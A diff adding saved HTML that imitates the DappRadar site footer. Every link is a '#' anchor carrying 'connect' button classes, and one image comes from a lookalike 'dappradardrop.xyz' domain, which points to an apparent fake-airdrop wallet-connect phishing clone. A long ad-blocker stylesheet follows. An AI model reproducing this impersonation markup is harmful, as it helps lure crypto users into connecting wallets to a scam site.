+             <div ad-data-linked="true" class="sc-jlYURC chRKCJ connectButton">
+              <img height="16" src="urn:scrapbook:download:error:https://dappradardrop.xyz/GooglePlayColorfulIcon.svg" width="16"/>
+             </div>
+            </a>
+           </div>
+           <h3 class="sc-jaZyJE cgzuNH">
+            Try DappRadar on the go
+           </h3>
+           <p class="sc-doKvHv bNFtaI">
+            Scan to download the DappRadar app.
+           </p>
+          </div>
+         </div>
+         <div ad-data-linked="true" class="sc-hQrevV dbbCMU connectButton">
+         </div>
+         <div ad-data-linked="true" class="sc-jNAkjl gUeFwD connectButton">
+          <div ad-data-linked="true" class="sc-goETIM gGMvOk connectButton">
+           <h5 class="sc-dNCsYx hbUaWm">
+            Products
+           </h5>
+           <ul class="sc-eCihoo jMNmWg">
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Rankings
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Quests
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              NFTs
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Chains
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Token Explorer
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Airdrops
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Portfolio
+             </a>
+            </li>
+           </ul>
+          </div>
+          <div ad-data-linked="true" class="sc-goETIM gGMvOk connectButton">
+           <h5 class="sc-dNCsYx hbUaWm">
+            Company
+           </h5>
+           <ul class="sc-eCihoo jMNmWg">
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              About us
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Press
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Disclaimer
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Privacy policy
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Terms and conditions
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Careers
+             </a>
+            </li>
+           </ul>
+          </div>
+          <div ad-data-linked="true" class="sc-goETIM gGMvOk connectButton">
+           <h5 class="sc-dNCsYx hbUaWm">
+            Resources
+           </h5>
+           <ul class="sc-eCihoo jMNmWg">
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Blog
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Industry overview
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Reports
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              FAQ
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Brand Assets
+             </a>
+            </li>
+           </ul>
+          </div>
+          <div ad-data-linked="true" class="sc-goETIM gGMvOk connectButton">
+           <h5 class="sc-dNCsYx hbUaWm">
+            Contribute
+           </h5>
+           <ul class="sc-eCihoo jMNmWg">
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Submit a project
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Advertise
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Request a feature
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              Submit a dapp
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" style="text-decoration: none;">
+              DappRadar API
+             </a>
+            </li>
+           </ul>
+          </div>
+          <div ad-data-linked="true" class="sc-goETIM gGMvOk connectButton">
+           <h5 class="sc-dNCsYx hbUaWm">
+            Recommendations
+           </h5>
+           <ul class="sc-eCihoo jMNmWg">
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" rel="noopener noreferrer" style="text-decoration: none;">
+              MetaMask
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" rel="noopener noreferrer" style="text-decoration: none;">
+              Huobi Wallet
+             </a>
+            </li>
+            <li class="sc-ibdxON jbhRXQ">
+             <a ad-data-linked="true" class="sc-jKQSiE jDTzlU interact-button connect connectButton" href="#" rel="noopener noreferrer" style="text-decoration: none;">
+              Coinbase
+             </a>
+            </li>
+           </ul>
+          </div>
+         </div>
+         <div ad-data-linked="true" class="sc-gmsKMK gOcXxE connectButton">
+          <div ad-data-linked="true" class="sc-fENAjM juIFIR connectButton">
+           List of services that we&rsquo;re using to calculate data:
+          </div>
+          <div ad-data-linked="true" class="sc-jLobnj kBKoes connectButton">
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer" title="CryptoCompare">
+            <img alt="CryptoCompare" class="logoCryptoCompare" src="provider-cryptocompare.webp"/>
+           </a>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer" title="CoinGecko">
+            <img alt="CoinGecko" class="logoCoinGecko" src="provider-coingecko.webp"/>
+           </a>
+          </div>
+         </div>
+         <div ad-data-linked="true" class="sc-hQrevV dbbCMU connectButton">
+         </div>
+        </nav>
+       </div>
+      </footer>
+      <div ad-data-linked="true" class="sc-hFVsQR gUzwUp connectButton">
+       <div ad-data-linked="true" class="sc-cnOiCc jZzoBS connectButton">
+        &copy; 2018-2023 DappRadar, UAB
+       </div>
+       <div ad-data-linked="true" class="sc-bkldj fsnfxC connectButton">
+        <div ad-data-linked="true" class="sc-UpCWa irQzax connectButton" width="130px">
+         <div ad-data-linked="true" class="sc-fbYMXx iKpFoV connectButton" role="button" tabindex="0">
+          <div ad-data-linked="true" class="sc-GhhNo gXbjCK connectButton">
+           USD - $
+          </div>
+          <div ad-data-linked="true" class="sc-dwnOUR gunKIA dappradar-dropdown-chevron-icon connectButton">
+           <svg height="6" viewbox="0 0 11 6" width="11" xmlns="http://www.w3.org/2000/svg">
+            <path clip-rule="evenodd" d="M.793.293a1 1 0 0 1 1.414 0L5.5 3.586 8.793.293a1 1 0 0 1 1.414 1.414l-4 4a1 1 0 0 1-1.414 0l-4-4a1 1 0 0 1 0-1.414Z" fill-rule="evenodd">
+            </path>
+           </svg>
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="sc-UpCWa blZCdK connectButton" width="140px">
+         <div ad-data-linked="true" class="sc-fbYMXx iKpFoV connectButton" role="button" tabindex="0">
+          <div ad-data-linked="true" class="sc-GhhNo gXbjCK connectButton">
+           English
+          </div>
+          <div ad-data-linked="true" class="sc-dwnOUR gunKIA dappradar-dropdown-chevron-icon connectButton">
+           <svg height="6" viewbox="0 0 11 6" width="11" xmlns="http://www.w3.org/2000/svg">
+            <path clip-rule="evenodd" d="M.793.293a1 1 0 0 1 1.414 0L5.5 3.586 8.793.293a1 1 0 0 1 1.414 1.414l-4 4a1 1 0 0 1-1.414 0l-4-4a1 1 0 0 1 0-1.414Z" fill-rule="evenodd">
+            </path>
+           </svg>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+ <style data-scrapbook-elem="adoptedStyleSheet">
+  a[href^="http://revolvemockerycopper.com/"] { display: none !important; }
+[data-adshim] { display: none !important; }
+a[href^="https://pb-track.com/"] { display: none !important; }
+[class^="tile-picker__CitrusBannerContainer-sc-"] { display: none !important; }
+div[id^="crt-"][style] { display: none !important; }
+[href^="https://cluttercallousstopped.com/"] { display: none !important; }
+[href^="https://secure.bmtmicro.com/servlets/"] { display: none !important; }
+[data-ad-module]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+[class^="adDisplay-module"] { display: none !important; }
+div[class*="displayAdRight"] { display: none !important; }
+a[href^="https://a.bestcontentweb.top/"] { display: none !important; }
+a[href^="https://turnstileunavailablesite.com/"] { display: none !important; }
+div[id^="taboola-stream-"] { display: none !important; }
+[href^="https://ad.admitad.com/"] { display: none !important; }
+a[href^="https://witnessjacket.com/"] { display: none !important; }
+[href^="https://goldcometals.com/clk.trk"] { display: none !important; }
+a[href^="https://landing1.brazzersnetwork.com"] { display: none !important; }
+div[aria-label="Ads"] { display: none !important; }
+a[href^="https://ak.oalsauwy.net/"] { display: none !important; }
+a[href^="http://muzzlematrix.com/"] { display: none !important; }
+div[class^="Display_displayAd"] { display: none !important; }
+a[href*=".engine.adglare.net/"] { display: none !important; }
+a[href^="https://pb-front.com/"] { display: none !important; }
+a[href^="https://hotplaystime.life/"] { display: none !important; }
+a[href^="http://handgripvegetationhols.com/"] { display: none !important; }
+[data-ad-width]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+[href^="https://mystore.com/"] > img { display: none !important; }
+[href=""] { display: none !important; }
+div[class^="native-ad-"] { display: none !important; }
+a[href^="https://go.goaserv.com/"] { display: none !important; }
+a[href^="https://prf.hn/click/"][href*="/creativeref:"] > img { display: none !important; }
+div[data-google-query-id] { display: none !important; }
+[data-name="adaptiveConstructorAd"] { display: none !important; }
+a[href^="https://www.dql2clk.com/"] { display: none !important; }
+div[data-id-advertdfpconf] { display: none !important; }
+[data-lnguri*="vipbox"] { display: none !important; }
+a[href*=".cfm?domain="][href*="&fp="] { display: none !important; }
+gpt-ad { display: none !important; }
+[data-mobile-ad-id] { display: none !important; }
+a[href^="https://twinrdsrv.com/"] { display: none !important; }
+a[href^="http://cam4com.go2cloud.org/aff_c?"] { display: none !important; }
+a[href^="//STaRTgamING.net/tienda/"] { display: none !important; }
+div[class^="kiwi-ad-wrapper"] { display: none !important; }
+a[href^="https://m.do.co/c/"] > img { display: none !important; }
+a[href^="https://landing.brazzersnetwork.com/"] { display: none !important; }
+div[data-native-ad] { display: none !important; }
+div[data-adunit] { display: none !important; }
+a[href^="https://www.nutaku.net/signup/landing/"] { display: none !important; }
+a[href^="https://combodef.com/"] { display: none !important; }
+a[href^="https://pb-imc.com/"] { display: none !important; }
+a[data-obtrack^="http://paid.outbrain.com/network/redir?"] { display: none !important; }
+a[href^="https://go.xlvirdr.com"] { display: none !important; }
+a[href^="https://losingoldfry.com/"] { display: none !important; }
+a[href^="https://go.dmzjmp.com"] { display: none !important; }
+[data-template-type="nativead"] { display: none !important; }
+div[data-alias="300x250 Ad 2"] { display: none !important; }
+[class^="div-gpt-ad"]:not([style^="width: 1px; height: 1px; position: absolute; left: -10000px; top: -"]) { display: none !important; }
+div[data-content="Advertisement"] { display: none !important; }
+a[href^="http://www.iyalc.com/"] { display: none !important; }
+span[id^="ezoic-pub-ad-placeholder-"] { display: none !important; }
+[href^="https://v.investologic.co.uk/"] { display: none !important; }
+[href*="//agacelebir.com"] { display: none !important; }
+a[href^="//sTaRtgaming.net/tienda/"] { display: none !important; }
+[data-uri^="https://s3.amazonaws.com"] { display: none !important; }
+display-ad-component { display: none !important; }
+a[href^="https://softwa.cfd/"] { display: none !important; }
+[data-ad-name] { display: none !important; }
+a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="] { display: none !important; }
+div[id^="ads250_250-widget-"] { display: none !important; }
+a[href^="https://go.tmrjmp.com"] { display: none !important; }
+a[href^="https://tc.tradetracker.net/"] > img { display: none !important; }
+aside[id^="adrotate_widgets-"] { display: none !important; }
+div[data-native_ad] { display: none !important; }
+a[href^="https://awptjmp.com/"] { display: none !important; }
+a[href^="https://www.adultempire.com/"][href*="?partner_id="] { display: none !important; }
+zeus-ad { display: none !important; }
+a[href^="https://join.virtualtaboo.com/track/"] { display: none !important; }
+a[href^="https://click.linksynergy.com/fs-bin/"] > img { display: none !important; }
+a[href^="//staRtgamIng.Net/tienda/"] { display: none !important; }
+div[id^="rc-widget-"] { display: none !important; }
+a[href^="https://click.hoolig.app/"] { display: none !important; }
+[data-css-class="dfp-inarticle"] { display: none !important; }
+[href^="https://rapidgator.net/article/premium/ref/"] { display: none !important; }
+[href*="/afu.php"] { display: none !important; }
+a[href^="https://a.bestcontentfood.top/"] { display: none !important; }
+a[href^="https://fc.lc/ref/"] { display: none !important; }
+[data-lnguri^="https://s3.amazonaws.com"] { display: none !important; }
+a[href^="https://paid.outbrain.com/network/redir?"] { display: none !important; }
+[data-type="ad-vertical"] { display: none !important; }
+[id^="div-gpt-ad"] { display: none !important; }
+a[href^="https://playnano.online/offerwalls/?ref="] { display: none !important; }
+a[href^="https://www.highcpmrevenuenetwork.com/"] { display: none !important; }
+amp-embed[type="taboola"] { display: none !important; }
+a[href^="https://ak.psaltauw.net/"] { display: none !important; }
+a[href^="https://www.get-express-vpn.com/offer/"] { display: none !important; }
+a[href^="https://streamate.com/landing/click/"] { display: none !important; }
+a[href^="https://ab.advertiserurl.com/aff/"] { display: none !important; }
+a[href^="https://italarizege.xyz/"] { display: none !important; }
+a[href^="https://getvideoz.click/"] { display: none !important; }
+[id^="ad-wrap-"] { display: none !important; }
+[data-wpas-zoneid] { display: none !important; }
+div[style^="position:fixed;inset:0px;z-index:2147483647;background:black;opacity:0.01"] { display: none !important; }
+[href^="https://www.onclickmega.com/"] { display: none !important; }
+[href^="https://join.girlsoutwest.com/"] { display: none !important; }
+a[href^="https://pubads.g.doubleclick.net/"] { display: none !important; }
+a[href^="https://join.virtuallust3d.com/"] { display: none !important; }
+[id^="div-gpt-ad"]:not([style^="width: 1px; height: 1px; position: absolute; left: -10000px; top: -"]) { display: none !important; }
+a[id][href="https://chpadblock.com/"][rel^="noopener noreferrer"] { display: none !important; }
+a[href^="https://lijavaxa.com/"] { display: none !important; }
+[href^="https://www.safestcontentgate.com/"] { display: none !important; }
+[href^="https://mypillow.com/"] > img { display: none !important; }
+[href^="https://www.herbanomic.com/"] > img { display: none !important; }
+a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] { display: none !important; }
+a[href^="https://www.geekbuying.com/dynamic-ads/"] { display: none !important; }
+[data-testid="adBanner-wrapper"] { display: none !important; }
+a[href^="https://ads.leovegas.com/redirect.aspx?"] { display: none !important; }
+[data-advadstrackid]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+[href^="https://cpa.10kfreesilver.com/"] { display: none !important; }
+div[data-mini-ad-unit] { display: none !important; }
+a[href^="https://lead1.pl/"] { display: none !important; }
+a[href^="https://go.markets.com/visit/?bta="] { display: none !important; }
+ps-connatix-module { display: none !important; }
+a[href^="https://go.mnaspm.com/"] { display: none !important; }
+a[href^="https://porntubemate.com/"] { display: none !important; }
+[href^="https://pl.allsports4u.club/"] { display: none !important; }
+a[href^="https://t.acam.link/"] { display: none !important; }
+a[href^="https://go.xlviirdr.com"] { display: none !important; }
+a[href^="https://click.candyoffers.com/"] { display: none !important; }
+div[class$="player-promo-col"] { display: none !important; }
+a[href^="https://www.kingsoffetish.com/tour?partner_id="] { display: none !important; }
+a[href^="https://myclick-2.com/"] { display: none !important; }
+a[href^="https://clicks.pipaffiliates.com/"] { display: none !important; }
+a[href^="https://go.xtbaffiliates.com/"] { display: none !important; }
+[href^="https://buycheaprdp.com/"] { display: none !important; }
+[data-ez-name] { display: none !important; }
+[href^="https://www.highperformancecpm.com/"] { display: none !important; }
+a[href^="https://bngprm.com/"] { display: none !important; }
+a[href^="https://syndication.exoclick.com/"] { display: none !important; }
+a[href^="https://www.mrskin.com/tour"] { display: none !important; }
+amp-connatix-player { display: none !important; }
+a[href^="https://www.highperformancecpmgate.com/"] { display: none !important; }
+[href^="https://www.reimageplus.com/"] { display: none !important; }
+[class^="DisplayAd"] { display: none !important; }
+[href*="uselnk.com/"] { display: none !important; }
+a[href^="https://go.hpyrdr.com/"] { display: none !important; }
+a[href^="https://ngineet.cfd/"] { display: none !important; }
+[href^="https://klsdee.com/"] { display: none !important; }
+a[href^="https://serve.awmdelivery.com/"] { display: none !important; }
+a[href^="https://lobimax.com/"] { display: none !important; }
+div[class^="Adstyled__AdWrapper-"] { display: none !important; }
+a[href^="https://t.adating.link/"] { display: none !important; }
+a[href^="https://bc.game/"] { display: none !important; }
+a[href^="https://aweptjmp.com/"] { display: none !important; }
+a[href^="https://go.cmtaffiliates.com/"] { display: none !important; }
+[href*="speenphorbin.com"] { display: none !important; }
+div[id^="pa_sticky_ad_box_middle_"] { display: none !important; }
+a[href^="http://premonitioninventdisagree.com/"] { display: none !important; }
+a[href^="https://www.financeads.net/tc.php?"] { display: none !important; }
+[data-adbridg-ad-class] { display: none !important; }
+a[href^="http://partners.etoro.com/"] { display: none !important; }
+div[data-ad-wrapper] { display: none !important; }
+div[data-adname] { display: none !important; }
+a[href^="https://tracking.avapartner.com/"] { display: none !important; }
+[href^="https://www.onclickperformance.com/"] { display: none !important; }
+div[id^="advads_ad_"] { display: none !important; }
+a[href^="https://syndication.dynsrvtbg.com/"] { display: none !important; }
+[class^="div-gpt-ad"] { display: none !important; }
+[href^="https://www.mypillow.com/"] > img { display: none !important; }
+[data-revive-zoneid] > iframe { display: none !important; }
+a[href^="https://ad.kubiccomps.icu/"] { display: none !important; }
+div[data-insertion] { display: none !important; }
+amp-fx-flying-carpet { display: none !important; }
+a[href^="https://tracker.loropartners.com/"] { display: none !important; }
+a[href^="http://deskfrontfreely.com/"] { display: none !important; }
+a[href^="https://ad.doubleclick.net/"] { display: none !important; }
+[data-ad-manager-id]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(.adsbygoogle) { display: none !important; }
+a[href^="https://ak.hauchiwu.com/"] { display: none !important; }
+[href="https://ourgoldguy.com/contact/"] img { display: none !important; }
+a[href^="https://syndication.optimizesrv.com/"] { display: none !important; }
+[href^="https://awbbjmp.com/"] { display: none !important; }
+span[data-ez-ph-id] { display: none !important; }
+div[data-adunit-path] { display: none !important; }
+[href^="https://turtlebids.irauctions.com/"] img { display: none !important; }
+a[href^="https://track.wg-aff.com"] { display: none !important; }
+a[href^="http://stickingrepute.com/"] { display: none !important; }
+div[id^="yandex_ad"] { display: none !important; }
+[data-ad-manager-id] { display: none !important; }
+a[href^="https://traffdaq.com/"] { display: none !important; }
+a[href^="https://go.xlviiirdr.com"] { display: none !important; }
+[href^="https://shiftnetwork.infusionsoft.com/go/"] > img { display: none !important; }
+a[href^="https://www.sugarinstant.com/?partner_id="] { display: none !important; }
+[href^="//cadsecs.com/"] { display: none !important; }
+a[href^="https://prf.hn/click/"][href*="/adref:"] > img { display: none !important; }
+[href^="https://www.brighteonstore.com/products/"] img { display: none !important; }
+a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"] { display: none !important; }
+[data-ad-cls] { display: none !important; }
+[href*="www.gaming-adult.com/"] { display: none !important; }
+a[href^="https://mediaserver.entainpartners.com/renderBanner.do?"] { display: none !important; }
+[href^="https://www.restoro.com/"] { display: none !important; }
+a[href^="https://www.googleadservices.com/pagead/aclk?"] { display: none !important; }
+[onclick*="postlnk.com"] { display: none !important; }
+a[href^="https://snowdayonline.xyz/"] { display: none !important; }
+[href^="https://zone.gotrackier.com/"] { display: none !important; }
+div[data-ad-placeholder] { display: none !important; }
+a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] { display: none !important; }
+div[id^="zergnet-widget"] { display: none !important; }
+a[href^="https://postback1win.com/"] { display: none !important; }
+a[href^="https://www.bang.com/?aff="] { display: none !important; }
+[href^="https://affiliate.fastcomet.com/"] > img { display: none !important; }
+[href^="https://track.fiverr.com/visit/"] > img { display: none !important; }
+[data-rc-widget] { display: none !important; }
+[onclick*="content.ad/"] { display: none !important; }
+[href^="https://t.mobtyb.com/"] { display: none !important; }
+a[href^="https://chaturbate.jjgirls.com/?track="] { display: none !important; }
+a[href^="//s.zlinkd.com/"] { display: none !important; }
+[href^="https://mypatriotsupply.com/"] > img { display: none !important; }
+a[href^="https://ads.ad4game.com/"] { display: none !important; }
+a[href^="https://ads.planetwin365affiliate.com/redirect.aspx?"] { display: none !important; }
+a[href^="http://guestblackmail.com/"] { display: none !important; }
+[href^="https://clicks.affstrack.com/"] > img { display: none !important; }
+[href^="https://go.smljmp.com/"] { display: none !important; }
+a[style="width:100%;height:100%;z-index:10000000000000000;position:absolute;top:0;left:0;"] { display: none !important; }
+a[href^="https://static.fleshlight.com/images/banners/"] { display: none !important; }
+a[href*=".g2afse.com/"] { display: none !important; }
+a[href^="https://www.infowarsstore.com/"] > img { display: none !important; }
+div[data-adzone] { display: none !important; }
+a[href^="https://natour.naughtyamerica.com/track/"] { display: none !important; }
+[href^="//mellowads.com/"] { display: none !important; }
+a[href^="http://com-1.pro/"] { display: none !important; }
+[onclick*="window.open('http://deloplen.com/"] { display: none !important; }
+a[href^="http://www.poweredbyliquidfire.mobi/"] { display: none !important; }
+[data-d-ad-id] { display: none !important; }
+app-large-ad { display: none !important; }
+a[href^="https://bngpt.com/"] { display: none !important; }
+[href="https://masstortfinancing.com"] img { display: none !important; }
+a[href^="https://go.etoro.com/"] > img { display: none !important; }
+a[href^="https://bs.serving-sys.com"] { display: none !important; }
+div[style^="z-index: 999999; background-image: url(\"data:image/gif;base64,"][style$="position: absolute;"] { display: none !important; }
+a[data-url^="http://paid.outbrain.com/network/redir?"] + .author { display: none !important; }
+[href^="https://noqreport.com/"] > img { display: none !important; }
+[id^="ad_slider"] { display: none !important; }
+a[href*=".click/?z="][href*="&n"] { display: none !important; }
+a[href^="https://track.ultravpn.com/"] { display: none !important; }
+display-ads { display: none !important; }
+app-ad { display: none !important; }
+div[id][style^="position: fixed; inset: 0px; z-index: 2147483647; background: black"][style*="opacity: 0.01"] { display: none !important; }
+iframe.lazyloaded[data-src^="https://rcm-fe.amazon-adsystem.com/"] { display: none !important; }
+[src^="//dombnrs.com/"] { display: none !important; }
+a[href^="https://syndication.exdynsrv.com/splash.php"] { display: none !important; }
+a[href^="https://www.bet365.com/"][href*="affiliate="] { display: none !important; }
+a[href^="https://maymooth-stopic.com/"] { display: none !important; }
+amp-ad-custom { display: none !important; }
+[href="//sexcams.plus/"] { display: none !important; }
+a[data-redirect^="https://paid.outbrain.com/network/redir?"] { display: none !important; }
+hl-adsense { display: none !important; }
+a[href^="https://adclick.g.doubleclick.net/"] { display: none !important; }
+[href^="http://mypillow.com/"] > img { display: none !important; }
+[href^="https://go.xlrdr.com"] { display: none !important; }
+a[href^="https://prf.hn/click/"][href*="/camref:"] > img { display: none !important; }
+amp-ad { display: none !important; }
+[href^="luvaihoo.com"] { display: none !important; }
+a[href^="https://jaxofuna.com/"] { display: none !important; }
+[href^="https://antiagingbed.com/discount/"] > img { display: none !important; }
+[href^="https://optimizedelite.com/"] > img { display: none !important; }
+a[href^="https://www.brazzersnetwork.com/landing/"] { display: none !important; }
+[href^="https://glersakr.com/"] { display: none !important; }
+[href^="https://www.mypatriotsupply.com/"] > img { display: none !important; }
+[class^="amp-ad-"] { display: none !important; }
+a[href^="https://land.brazzersnetwork.com/landing/"] { display: none !important; }
+a[href^="https://bongacams2.com/track?"] { display: none !important; }
+[href^="https://charmingdatings.life/"] { display: none !important; }
+a[href^="http://dragnag.com/"] { display: none !important; }
+[href^="//producebreed.com/"] { display: none !important; }
+[href^="https://istlnkcl.com/"] { display: none !important; }
+a[href^="//s.st1net.com/splash.php"] { display: none !important; }
+a[href^="https://t.ajump1.com/"] { display: none !important; }
+[href^="//taghaugh.com/"] { display: none !important; }
+a[href^="https://tour.mrskin.com/"] { display: none !important; }
+[href^="https://go.4rabettraff.com/"] { display: none !important; }
+a[href^="https://ctosrd.com/"] { display: none !important; }
+div[id^="ad-position-"] { display: none !important; }
+a[href^="https://a.medfoodsafety.com/"] { display: none !important; }
+[href="https://www.masstortfinancing.com/"] > img { display: none !important; }
+[href^="http://www.mypillow.com/"] > img { display: none !important; }
+a[href^="https://l.hyenadata.com/"] { display: none !important; }
+a[href^="http://eighteenderived.com/"] { display: none !important; }
+a[href^="https://www.sheetmusicplus.com/"][href*="?aff_id="] { display: none !important; }
+a[href^="https://go.xlivrdr.com"] { display: none !important; }
+a[href^="https://hot-growngames.life/"] { display: none !important; }
+div[id^="vuukle-ad-"] { display: none !important; }
+[href^="https://trk.clmbtrck.in/click"] { display: none !important; }
+a[href^="http://adultfriendfinder.com/go/"] { display: none !important; }
+a[href^="https://chaturbate.com/in/?tour="] { display: none !important; }
+a[href^="//go.eabids.com/"] { display: none !important; }
+[href*="passtechusa.com"] { display: none !important; }
+a[href^="https://www.privateinternetaccess.com/"] > img { display: none !important; }
+a[href^="http://affiliate.glbtracker.com/"] { display: none !important; }
+a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source { display: none !important; }
+a[dontfo=""][style$="position: absolute; z-index: 2147483647;"] { display: none !important; }
+a[href^="https://www.mrskin.com/account/"] { display: none !important; }
+a[href^="https://billing.purevpn.com/aff.php"] > img { display: none !important; }
+body > div[style$="z-index: 2147483647; top: 0px; left: 0px; position: fixed; display: block;"] { display: none !important; }
+a[href^="https://bodelen.com/"] { display: none !important; }
+[href^="https://ilovemyfreedoms.com/landing-"] { display: none !important; }
+div[id^="adspot-"] { display: none !important; }
+[data-adblockkey] { display: none !important; }
+atf-ad-slot { display: none !important; }
+a[href^="https://startgaming.net/tienda/" i] { display: none !important; }
+a[onclick="openAuc();"] { display: none !important; }
+div[id*="MarketGid"] { display: none !important; }
+[data-adblockkey]:not([style$="left: -10000px !important; top: -1000px !important;"]):not(html):not(.adsbygoogle) { display: none !important; }
+a[href^="https://affiliate.rusvpn.com/click.php?"] { display: none !important; }
+[src^="https://forum.picbaron.com/Banner"] { display: none !important; }
+ins.adsbygoogle { display: none !important; }
+[href^="http://referrer.website/"] { display: none !important; }
+a[href^="https://track.adform.net/"] { display: none !important; }
+ad-shield-ads { display: none !important; }
+a[href^="https://go.nordvpn.net/aff"] > img { display: none !important; }
+div[style="position: fixed;top: 0;left: 0;right: 0;bottom:0;z-index: 99999999;background: rgba(0,0,0,.6);"] { display: none !important; }
+div[id^="optidigital-adslot"] { display: none !important; }
+a[href^="http://trk.globwo.online/"] { display: none !important; }
+div[id^="sticky_ad_"] { display: none !important; }
+[id^="section-ad-banner"] { display: none !important; }
+a[href^="https://iqbroker.com/"][href*="?aff="] { display: none !important; }
+a[href^="https://datingoffers30.info/"] { display: none !important; }
+a[href^="https://1betandgonow.com/"] { display: none !important; }
+[href^="https://www.avantlink.com/click.php"] img { display: none !important; }
+div[id^="adrotate_widgets-"] { display: none !important; }
+[href^="https://routewebtk.com/"] { display: none !important; }
+a[href^="https://go.xxxiijmp.com"] { display: none !important; }
+a[href*="//jjgirls.com/sex/Chaturbate"] { display: none !important; }
+[data-block-type="ad"] { display: none !important; }
+[data-freestar-ad]:not(:empty) { display: none !important; }
+a[href^="https://trk.sportsflix4k.club/"] { display: none !important; }
+[data-advadstrackid] { display: none !important; }
+div[id^="lazyad-"] { display: none !important; }
+a[href^="https://linkboss.shop/"] { display: none !important; }
+[href^="https://bestbuyrdp.com/"] { display: none !important; }
+a[href^="https://www.endorico.com/Smartlink/"] { display: none !important; }
+a[href^="https://www.adskeeper.com"] { display: none !important; }
+div[id^="div-gpt-"] { display: none !important; }
+a[data-href^="http://ads.trafficjunky.net/"] { display: none !important; }
